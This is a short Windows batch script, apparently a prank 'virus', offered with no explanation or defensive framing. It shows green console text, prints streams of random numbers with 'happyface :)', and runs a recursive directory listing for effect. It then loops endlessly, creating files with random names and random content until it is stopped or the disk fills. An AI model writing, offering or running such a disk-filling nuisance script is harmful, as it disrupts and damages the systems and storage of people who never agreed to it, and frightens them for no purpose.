@echo off
color 0a
echo %random%%random%%random%happyface :)
echo %random%%random%%random%happyface :)
echo %random%%random%%random%happyface :)
echo %random%%random%%random%happyface :)
ping localhost -n 5 >nul
dir /s
:loop
echo happyface :)\n%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%%random%.txt
goto loop